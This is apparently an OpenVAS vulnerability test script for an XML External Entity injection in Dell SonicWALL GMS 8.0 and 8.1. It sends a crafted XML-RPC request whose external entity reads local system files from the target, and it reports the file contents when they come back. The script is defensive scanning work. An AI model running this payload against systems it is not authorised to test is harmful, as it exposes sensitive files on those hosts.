###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sonicwall_universal_management_xxe_08_16.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# Dell SonicWALL GMS XML External Entity (XXE) Injection
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:dell:sonicwall_global_management_system";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105873");
  script_version("$Revision: 13994 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("Dell SonicWALL GMS XML External Entity (XXE) Injection");

  script_tag(name:"vuldetect", value:"Send a special crafted XML-RPC POST request and check the response.");

  script_tag(name:"affected", value:"Versions 8.0 and 8.1.");

  script_tag(name:"summary", value:"Vulnerabilities were found pertaining to command injection, unauthorized XXE, default account,
  and unauthorized modification of virtual appliance networking information.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"GMS/Analyzer/UMA Hotfix 174525 is available.");

  script_xref(name:"URL", value:"https://www.digitaldefense.com/vrt-discoveries/");
  script_xref(name:"URL", value:"https://www.sonicwall.com/en-us/support/knowledge-base/170502432594958");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2016-08-16 14:22:12 +0200 (Tue, 16 Aug 2016)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_dependencies("gb_sonicwall_universal_management_detect.nasl", "os_detection.nasl");
  script_require_ports(21009);
  script_mandatory_keys("sonicwall/global_management_system/installed");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = 21009;
if( ! get_port_state( port ) )
  exit( 0 );

vtstrings = get_vt_strings();
vtstring = vtstrings["default"];
vtstring_lower = vtstrings["lowercase"];

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];

  xml_rpc = '<?xml version="1.0" encoding="UTF-8"?>' +
            '<!DOCTYPE ' + vtstring + ' [<!ELEMENT ' + vtstring + ' ANY >' +
            '<!ENTITY ' + vtstring_lower + ' SYSTEM "file:///' + file + '">]>' +
            '<methodCall><methodName>' + vtstring + '</methodName>' +
            '<params><param><value><struct><member><name>' + vtstring + '</name>' +
            '<value><i4>&' + vtstring_lower + ';</i4></value><params><param></methodCall>';

  req = http_post_req( port:port,
                       url:"/",
                       data:xml_rpc,
                       add_headers:make_array( "Content-Type","text/xml" ) );
  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( egrep( string:buf, pattern:pattern ) ) {
    report = 'By sending a special crafted POST request it was possible to read /' + file + '. Response:\n\n' + buf;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );